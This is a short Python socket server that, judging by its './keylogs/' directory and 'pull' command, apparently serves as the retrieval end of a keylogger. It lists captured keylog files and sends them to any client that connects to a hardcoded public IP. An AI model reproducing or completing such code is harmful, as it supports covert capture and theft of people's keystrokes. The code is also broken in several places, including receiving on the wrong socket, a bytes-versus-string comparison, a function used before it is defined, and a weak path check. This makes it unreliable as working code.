#File Sever
import socket
import os
import fileinput
import sys

#setting up the server
tcp_port = 25006
buffer_size = 1024
serversocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
host = '35.196.2.248' #this is our server's static IP
serversocket.bind((host, tcp_port))

#listening for a connection and accepting it
print("Server started on " + host + " on port " + str(tcp_port) + "\n")
serversocket.listen()

while(True):
    connection, address = serversocket.accept()
    print ('Connected to ', address)
    #displaying the directory
    print ('Sending directory information...')
    directory_data = os.listdir(path = './keylogs/')
    sent_data = "====Keylog Files====\n" + "\n".join(directory_data)
    connection.send(sent_data.encode())
    #now listen for a command from client
    while(True):
        command = serversocket.recv(buffer_size)
        decode_command = command.decode()
        keyword = command[0:4]
        if keyword == "pull":
            _pull_file(decode_command)
        elif keyword == "quit":
            break
        else:
            sent_data = "Command not understood.\n"
            connection.send(sent_data.encode())

    connection.close()

serversocket.close()


def _pull_file(decode_command):
    filename = decode_command[4:]
    if filename[0:1] == ".":
        sent_data = "failure"
        connection.send(sent_data.encode())
        return
    try:
        f = open (filename, 'rb')
    except FileNotFoundError:
        sent_data = "failure"
        connection.send(sent_data.encode())
    else:
        sent_data = "success"
        connection.send(sent_data.encode())
        l = f.read(buffer_size)
        while (l):
            connection.send(l)
            l = f.read(buffer_size)


